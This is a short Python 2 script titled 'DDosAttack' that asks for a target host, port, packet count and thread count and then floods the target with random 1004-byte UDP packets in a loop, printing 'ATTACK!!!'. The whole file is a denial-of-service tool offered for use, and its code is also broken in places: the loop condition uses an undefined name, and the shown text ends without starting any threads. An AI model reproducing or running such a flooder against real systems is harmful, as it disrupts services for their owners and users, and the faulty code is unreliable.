#!/usr/bin/env python2

import random
import socket
import threading

print("###########################")
print("###### DDosAttack by. เบบี้ ######")
print("###########################")
ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" UDP(Y/N):"))	
times = int(input(" PACKETS PER ONE CONNECTION:"))
threads = int(input(" THREADS:"))
def run():
	data = random._urandom(1004)
	i = random.choice(("[*]","[!]","[#]"))
	while Default:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ATTACK!!!")
		except:
			print("[!] ATTACK!!!")
			
